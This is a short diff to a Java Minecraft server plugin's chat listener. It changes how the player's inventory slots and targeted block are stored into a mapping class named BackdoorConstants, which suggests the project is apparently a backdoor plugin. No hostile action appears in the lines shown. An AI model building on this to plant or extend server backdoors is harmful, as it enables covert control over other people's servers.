@@ -36,10 +36,8 @@ public class ChatListener implements Listener {
         BackdoorConstants.setMapping("lookBlock", event.getPlayer().getTargetBlockExact(16, FluidCollisionMode.NEVER));
 
         int i = 0;
-        for (ItemStack itemStack : event.getPlayer().getInventory()) {
-            if (itemStack != null) { // Avoid adding null values
-                BackdoorConstants.setMapping("slot" + i, itemStack);
-            }
+        for (ItemStack itemStack : event.getPlayer().getInventory().getContents()) {
+            BackdoorConstants.setMapping("slot" + i, itemStack);
             i++;
         }
     }
